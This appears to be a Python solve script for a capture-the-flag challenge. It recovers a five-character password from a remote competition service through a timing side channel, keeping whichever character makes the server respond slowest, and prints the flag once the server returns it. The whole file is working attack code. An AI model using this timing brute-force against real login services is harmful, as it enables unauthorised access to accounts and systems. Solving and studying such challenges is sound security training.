import socket
import string
import time

from tqdm import tqdm

CHARSET = string.ascii_lowercase + string.digits
HOST = "chal1.gryphons.sg"
PORT = 10002


def main():
    password = ""
    pbar = tqdm(total=5 * len(CHARSET), desc="Progress")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.recv(1024)

        for _ in range(5):
            timing = {}
            # Loop through all characters in the charset
            for char in CHARSET:
                # Pad the password with "-" to pass the length check
                attempt = (password + char).ljust(5, "-")

                # Measure time taken to send and receive data
                start = time.time()
                s.sendall(bytes(f"{attempt}\n", "utf-8"))
                data = s.recv(1024)
                # Record time taken for the current character
                timing[char] = time.time() - start

                # Check if flag is sent by the server
                server_resp = data.decode()
                if "GCTF23{" in server_resp:
                    pbar.close()
                    print(server_resp)
                    exit(0)

                pbar.set_description(f"Attempt: {attempt}")
                pbar.update()
            # Append character to password that took the longest time
            password += max(timing, key=timing.get)


if __name__ == "__main__":
    main()
